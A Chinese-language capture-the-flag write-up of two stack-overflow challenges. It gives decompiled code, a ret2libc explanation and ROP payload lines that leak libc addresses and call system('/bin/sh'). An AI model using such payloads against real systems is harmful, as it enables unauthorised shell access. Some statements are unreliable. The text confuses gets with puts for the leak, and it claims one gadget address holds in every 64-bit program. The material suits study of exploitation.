## ciscn_2019_c_1

```c
int encrypt()
{
  char s[48]; // [rsp+0h] [rbp-50h] BYREF
  // ...
  gets(s);
}
```

`gets`缓冲区溢出，但是程序中没有`system('/bin/sh')`，需要泄露libc

### 前置知识

[GOT表和PLT表](https://www.jianshu.com/p/0ac63c3744dd)

简单来说，plt表中`lib_fun`项存的是got表中`lib_fun`项的地址；但第一次调用`lib_fun`函数之前，got表中`lib_fun`项存的是一些装载工作的代码地址；在第一次调用开始后，装载代码把got表中`lib_fun`项存储的变为其实际地址

### 泄露函数地址

libc动态链接库有以下两个性质：

- 随库的版本不同，库中函数的地址不同
- 同一版本的库，两个函数的地址偏移相等

通过第一条性质，一旦我获得了任意libc库的函数地址，就能通过数据库得到libc的版本信息；得到版本信息之后，通过第二条性质，我又能计算出目标函数及字符串的地址（在这里是`system()`和`"/bin/sh"`）

[libc database search](https://libc.blukat.me/)

为了得到某个libc库的函数地址，可以使用输出的方式；由于plt表和got表的行为，在输出一个libc函数的地址之前需要先调用它，这就使得gets成为不二之选：只要构造出`gets(gets在got表中的地址)`的调用，就能输出`gets`的真实地址了

接下来考虑`gets(gets在got表中的地址)`这个调用的构造，由于64位程序使用寄存器传参，其中第一个参数是`%rdi`，而通过溢出，我能够影响的只有栈；那么我该做的就是：把栈顶数据弹出到`%rdi`，也就是`pop %rdi`指令；当然，由于跳转到这条指令之后我还需要跳转到`gets@plt`这个函数，所以当然还需要一个`ret`。故，我需要在程序中找到这样一条指令：`pop %rdi; ret`（在每个64位C程序中，其地址是0x400c83）。

得到`gets`之后怎么办？我还没把`system("/bin/sh")`打出去呢！重新进一遍有漏洞的地方就好了。那就可以构造出合适的栈数据了，根据函数的调用规则，以及由于缓冲区溢出需要覆盖返回地址，是：溢出填充 + `pop_rdi_ret`（返回地址覆盖） + `puts_got`（puts参数） + `puts_plt`（puts函数地址） + `encrypt`（puts返回）

在本题中是`payload = b'a' * 0x58 + p64(0x400c83) + p64(elf_file.got['puts']) + p64(elf_file.plt['puts']) + p64(0x4009a0)`

### 打出`system("/bin/sh")`

打出了第一阶段的payload之后，我能够得到`gets`的真实地址了。在[libc database search](https://libc.blukat.me/)上搜索可以得到几个函数的偏移地址。

二阶段的payload构造原理和一阶段的相同，额外需要注意的是，有些系统对`system`函数的调用要求`%rsp`的低4位是0（参考：[在一些64位的glibc的payload调用system函数失败问题](http://blog.eonew.cn/archives/958)），靶机上就是这样一个系统。在本题中此时的`%rsp`低4位是8，只需要在栈上多叠一次`ret`指令（0x400c85）即可。

`payload = b'a' * 0x58 + p64(0x400c85) + p64(0x400c83) + p64(bin_sh) + p64(system)`

需要注意的是，`encrypt`函数对缓冲区中的字符进行了异或操作，可能需要复原一下（尽管在本exp中没有写也攻击成功了）

## [OGeek2019]babyrop

```c
int __cdecl main()
{
  int buf; // [esp+4h] [ebp-14h] BYREF
  char v2; // [esp+Bh] [ebp-Dh]
  int fd; // [esp+Ch] [ebp-Ch]

  sub_80486BB();
  fd = open("/dev/urandom", 0);
  if ( fd > 0 )
    read(fd, &buf, 4u);
  v2 = sub_804871F(buf);
  sub_80487D0(v2);
  return 0;
}

int __cdecl sub_804871F(int a1)
{
  size_t v1; // eax
  char s[32]; // [esp+Ch] [ebp-4Ch] BYREF
  char buf[32]; // [esp+2Ch] [ebp-2Ch] BYREF
  ssize_t v5; // [esp+4Ch] [ebp-Ch]

  memset(s, 0, sizeof(s));
  memset(buf, 0, sizeof(buf));
  sprintf(s, "%ld", a1);
  v5 = read(0, buf, 0x20u);
  buf[v5 - 1] = 0;
  v1 = strlen(buf);
  if ( strncmp(buf, s, v1) )
    exit(0);
  write(1, "Correct\n", 8u);
  return (unsigned __int8)buf[7];
}

ssize_t __cdecl sub_80487D0(char a1)
{
  ssize_t result; // eax
  char buf[231]; // [esp+11h] [ebp-E7h] BYREF

  if ( a1 == 127 )
    result = read(0, buf, 0xC8u);
  else
    result = read(0, buf, a1);
  return result;
}
```

`main()`函数产生一个随机的整数；第一个函数将该整数字符串化，让用户输入一个字符串进行比较，相等时返回用户输入的第8个字符a；此作为第三个函数的输入，从`stdin`读取a字节的数据，而缓冲区距离栈顶0xe7字节；所以解题点是缓冲区溢出

`strncmp(s1, s2, 0)`的调用总是返回0的，故构造`strlen(buf)`为0，又因为`read()`函数读取固定大小，故只需第一个输入的首字节`\x00`；并且第一个输入的第8个字符a作为第三个函数的读取数量，应该是`\xff`；

`payload_a = b'\x00' + b'\xff'*0x18`

之后第二个输入就是缓冲区溢出覆盖返回地址了，由于程序中没有`system("/bin/sh")`，故需要构造rop；注意本题中靶机是32位，不需要`pop_rdi_ret`；已用过的输出函数有`write(stream, buf, size)`

payload = 填充 + write函数地址（用于泄露libc） + 漏洞函数地址（二次进入漏洞以调用`system("/bin/sh")`） + 1（stream=stdout） + write_got（buf=write_got） + 4（size=4）

但是，由于漏洞函数`sub_80487D0(a1)`需要额外参数，而栈在构造rop时已经被破坏了，（在以下payload中，会调用`sub_80487D0(a1=p32(elf_file.got['write']))`）故只能返回到无参数的`main()`函数中

`payload_b = b'a'*(0xe7+4) + p32(elf_file.plt['write']) + p32(0x8048825) + p32(1) + p32(elf_file.got['write']) + p32(4)`

之后利用远端回显的地址和本题提供的.so文件，计算出目标函数信息，再打出一次`payload_a`二次进入漏洞函数，打出`system("/bin/sh")`

`payload_c = b'a'*(0xe7+4) + p32(system) + b'c'*4 + p32(bin_sh)`
